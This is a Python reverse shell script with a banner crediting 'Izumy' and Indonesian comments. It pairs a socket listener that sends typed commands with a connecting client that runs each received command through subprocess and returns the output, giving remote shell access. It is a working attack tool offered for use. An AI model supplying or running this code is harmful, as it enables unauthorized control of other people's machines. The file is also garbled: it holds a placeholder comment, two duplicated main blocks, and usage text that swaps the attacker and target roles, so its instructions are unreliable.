#!/usr/bin/env python3
# Simple Python Reverse Shell - Netcat Style
# Penggunaan: 
#   Target: python3 shell.py -l -p [PORT]
#   Attacker: python3 shell.py -c [IP] -p [PORT]

import socket
import subprocess
import sys
import argparse
from colorama import Fore, Style

class ReverseShellTool:
    def __init__(self):
        self.show_banner()
        
    def show_banner(self):
        banner = f"""
        {Fore.RED}╔══════════════════════════════════════════╗
        ║{Fore.YELLOW}      PYTHON REVERSE SHELL TOOL           {Fore.RED}║
        ║{Fore.CYAN}      Author: Izumy                       {Fore.RED}║  
        ║{Fore.GREEN}      Version: 1.0                        {Fore.RED}║
        ║{Fore.MAGENTA}      For authorized pentesting only      {Fore.RED}║
        ╚══════════════════════════════════════════╝
        {Style.RESET_ALL}
        """
        print(banner)

# ... (kode listener dan connection tetap sama)

if __name__ == '__main__':
    tool = ReverseShellTool()

def start_listener(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[*] Listening on 0.0.0.0:{port}")
    
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    while True:
        command = input("shell> ")
        if command.lower() == 'exit':
            conn.send(b'exit')
            break
        conn.send(command.encode())
        output = conn.recv(1024).decode()
        print(output)

def connect_to_host(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print(f"[*] Connected to {host}:{port}")
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        try:
            output = subprocess.getoutput(command)
            s.send(output.encode())
        except:
            s.send(b'Command failed')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', '--listen', action='store_true', help='Start listener')
    parser.add_argument('-c', '--connect', help='Connect to host')
    parser.add_argument('-p', '--port', type=int, default=4444, help='Port number')
    
    args = parser.parse_args()
    
    if args.listen:
        start_listener(args.port)
    elif args.connect:
        connect_to_host(args.connect, args.port)
    else:
        print("""
Simple Python Reverse Shell
Usage:
  Target:   python3 shell.py -l -p [PORT]
  Attacker: python3 shell.py -c [IP] -p [PORT]
Example:
  Target:   python3 shell.py -l -p 4444
  Attacker: python3 shell.py -c 192.168.1.100 -p 4444
        """)